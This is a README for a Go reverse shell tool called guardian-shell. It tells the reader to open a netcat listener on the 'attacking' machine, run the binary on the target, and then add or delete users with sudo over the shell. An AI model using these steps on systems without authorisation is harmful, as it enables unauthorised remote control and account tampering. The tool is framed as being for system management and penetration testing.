## what is it ?

Guardian-shell is a  secure reverse shell tool written in Go. Designed with a focus on responsible use and ethical practices, it facilitates secure communication between authorized parties. Guardian-shell empowers you with the ability to remotely execute commands on target machines, for easy system management, monitoring and penetration testing. 

## usage

step 1 : from your (attacking) machine run `nc -lvp 20090`

step 2 : run guardian_shell on the machine you want to attack. 
copy from this repo and paste it on the machine you want to attack and run it `./guardian-shell`
on success, it will give you response `Connected to the reverse guardian listner!` or it will wait for listner.

## sample commands

to add new user in remote linux server
```
echo ur_sudo_password | sudo -S useradd testuser; echo new_password_123 | passwd testuser
```

to delete user from remote linux server
```
echo ur_sudo_password | sudo -S userdel testuser
```

## on attack machine 
![image](https://github.com/avvvet/guardian-shell/assets/25494022/23a2039c-0d53-4fa9-9551-0e0bf3eed47a)

## on the remote machine to be attacked
![image](https://github.com/avvvet/guardian-shell/assets/25494022/bcc2d45a-f4ec-49ad-9def-8c46bad02074)